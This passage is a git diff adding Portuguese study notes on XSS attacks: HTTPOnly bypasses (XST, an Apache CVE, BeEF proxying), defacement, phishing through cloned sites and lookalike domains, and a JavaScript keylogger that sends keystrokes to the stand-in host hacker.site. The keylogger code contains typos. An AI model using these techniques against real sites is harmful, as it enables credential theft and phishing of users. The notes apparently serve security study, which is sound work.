@@ -149,3 +149,82 @@ sudo nc -lnvp 80
 
 ### Bypassing HTTPOnly Flag
 
+**XST** (antiga)
+
+Até agora os ataques vistos só funcionam se o cookie não estiver com a flag HTTPOnly setada.
+
+Para burlar essa proteção foi inventado uma técnica chamada de XST (Cross-Site Tracing), mas ela não funciona mais hoje
+
+Basicamente, essa técnica utiliza o método TRACE para enviar uma requisição contendo o cookie. Ela está descrita nesse paper: https://www.cgisecurity.com/whitehat-mirros/wh-whitepaper_xst_ebook.pdf
+
+**CVE-2012-0053**
+
+Outra forma de conseguir cookies com HTTPOnly é explorando uma vulnerabilidade no servidor. Um exemplo disso ocorre com o Apache HTTP Server 2.2.x 
+
+Essa vulnerabilidade pode ser explorada usando ferramentas como o BeEF ou a POC: https://gist.github.com/pilate/1955a1c28324d4724b7b
+
+**BeEF's Tunneling Proxy**
+
+Uma alternativa é usar o browser da vitima como um proxy. Basicamente, explorando o XSS podemos usar o browser da vitima para fazer requisições para a aplicação
+
+Para criar esse proxy, podemos usar a ferramenta BeEF, que nos ajuda a realizar hookes no browser. Essa técnica é interessante pois nos permite bypassar não só o HTTPOnly mas todas as proteções de validações usadas pelo servidor
+## Defacements
+
+O XSS também pode ser usado para fazer defacements em sites. Podemos dividir esse tipo de ataque em 2 categorias: Persistente e Não persistente. Ele também pode ser usado como parte de ataques mais sofisticados
+## Phishing
+
+É possível utilizar o XSS para fazer ataques de phishing
+
+Normalmente em um ataque de phishing, precisamos criar um site fake ou clonar algum site que será o alvo do ataque, e dentro desse site fake o atacante coloca o código que ele quer executar. Porém, se um site é vulnerável a XSS isso não é necessário, porque é possível colocar o código malicioso no próprio site alvo
+
+Como exemplo, podemos imaginar cenário onde queremos pegar informações de um site. Esse site possui um formulário onde os usuários enviam suas informações, então podemos usar o XSS para modificar o comportamento desse formulário para enviar as informações para o atacante
+### Cloning a Website
+
+Se quiser clonar um site para colocar o payload podemos usar algumas ferramentas:
+
+- Wget
+- BeEF
+- Site Cloner
+
+Um ponto muito importante para o sucesso no ataque de phishing após clonar um site é a escolha do domínio que será usado. Quanto mais parecido com o original melhor. Um exemplo de escolha pode ser o seguinte:
+```
+www.google.com -> wwwgoogle.com
+```
+
+Para ajudar na escolha do domínio, podemos usar a ferramenta URLCrazy
+
+```
+urlcrazy www.google.com
+```
+
+## Keylogging
+
+As vezes é interessante saber o que a vitima está digitando no site, com isso podemos, por exemplo, ler conversas, senhas, número de cartão de crédito, etc...
+
+Existem diversas formas de se fazer isso. Podemos fazer isso com um simples JavaScript
+```javascript
+var keys = ""; // WHERE -> Where to store the key strokes
+document.onkeypress = function(e){
+	var get = windows.event ? event : e;
+	var key = get.keyCode ? get.keyCode : get.charCode;
+	key = String.fromCharCode(key);
+	keys += key;
+}
+
+windows.setInterval(function(){
+	if(keys != ""){
+		// HOW -> sends the key strokes via GET using an Image element to listening hacker.site server
+		var path = ncodeURI("http://hacker.site/keylogger?k="+keys);
+		new Image().src = path;
+		keys = "";
+	}
+}, 1000); //WHEN -> sends the key strokes every second
+```
+
+Também é possível criar um keylogging usando ferramentas como:
+- BeEF (Event logger)
+- Metasploit (http_javascript_keylogger)
+
+### Keylogging with Mtasploit
+
+
